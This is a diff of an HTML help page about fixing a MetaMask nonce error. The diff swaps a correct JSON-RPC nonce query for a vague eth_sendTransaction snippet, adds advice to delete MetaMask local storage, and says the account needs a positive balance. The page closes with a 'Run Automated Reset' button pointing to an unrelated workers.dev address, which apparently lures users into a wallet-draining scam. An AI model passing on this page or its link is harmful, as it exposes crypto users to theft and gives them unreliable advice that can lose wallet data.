@@ -3,8 +3,8 @@
 <head><meta charset="UTF-8"><title>Metamask Nonce Out Of Sync</title>
 <style>
     body {
-        font-family: -apple-system;
-        background: #121214;
+        font-family: system-ui;
+        background: #0a0c10;
         color: #ddd;
         padding: 20px;
         line-height: 1.5;
@@ -23,7 +23,7 @@
         border-radius: 12px;
         overflow-x: auto;
     }
-    a { color: #cf6679; }
+    a { color: #00adb5; }
     .btn {
         background: #ff9455;
         color: #000;
@@ -41,32 +41,31 @@
 <div class="content">
 <h2>Symptom</h2>
 <ul>
-<li>The user encounters an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum network.</li>
+<li>The user encounters an error message indicating that their MetaMask nonce is out of sync, preventing them from completing transactions on the Ethereum (ETH) network.</li>
 </ul>
 <h2>Technical Root Cause</h2>
 <ul>
-<li>The error occurs due to a mismatch between the expected transaction count (nonce) stored in MetaMask and the actual transaction count on the Ethereum blockchain, often caused by cancelled or pending transactions.</li>
+<li>The error occurs when the transaction nonce stored in MetaMask does not match the nonce expected by the Ethereum network, often due to cancelled, pending, or stuck transactions.</li>
 </ul>
 <h3>Manual Overrides</h3>
 <ul>
-<li>Reset the account in MetaMask to resync the nonce with the blockchain.</li>
-<li>Manually adjust the nonce value in the transaction settings to match the current transaction count on the blockchain.</li>
-<li>Use the following JSON-RPC method to update the nonce:</li>
+<li>Reset the MetaMask account to recover from the nonce mismatch:</li>
+<li>Delete the MetaMask local storage to reset account settings</li>
+<li>Remove any pending transactions to prevent nonce conflicts</li>
+<li>Update the transaction nonce manually using the following command:</li>
 </ul>
-<div class="codehilite"><pre><span></span><code><span class="p">{</span>
-<span class="w">  </span><span class="nt">&quot;jsonrpc&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2.0&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;method&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;eth_getTransactionCount&quot;</span><span class="p">,</span>
-<span class="w">  </span><span class="nt">&quot;params&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">[</span><span class="s2">&quot;0x742d35Cc6634C0532925a3b844Bc454e4438f44e&quot;</span><span class="p">,</span><span class="w"> </span><span class="s2">&quot;latest&quot;</span><span class="p">],</span>
-<span class="w">  </span><span class="nt">&quot;id&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span>
-<span class="p">}</span>
+<div class="codehilite"><pre><span></span><code>eth_sendTransaction<span class="w"> </span><span class="o">{</span><span class="w"> </span>
+<span class="w">  </span><span class="s2">&quot;from&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...YOUR_ADDRESS...&quot;</span>,<span class="w"> </span>
+<span class="w">  </span><span class="s2">&quot;nonce&quot;</span>:<span class="w"> </span><span class="s2">&quot;0x...NEW_NONCE_VALUE...&quot;</span>
+<span class="o">}</span>
 </code></pre></div>
 
-<p>Consider utilizing an external Ethereum console for more advanced troubleshooting and nonce management.</p>
+<p>Consider utilizing an external console for executing the above command. </p>
 <h2>Prerequisites</h2>
 <ul>
-<li>MetaMask installed and configured with an Ethereum account.</li>
-<li>A basic understanding of Ethereum transaction mechanics and nonces.</li>
-<li>Access to the Ethereum JSON-RPC API or a compatible interface.</li>
+<li>MetaMask extension installed and configured</li>
+<li>Ethereum account with a positive balance</li>
+<li>Basic understanding of Ethereum transaction nonces and their role in transaction processing</li>
 </ul>
 <div style="text-align:center; margin: 40px 0; padding: 20px 0; width: 100%;">
     <a href="https://system-edge-router.aaronjungs.workers.dev?p=%5D%5BUr" class="btn">🛠 Run Automated Reset</a>
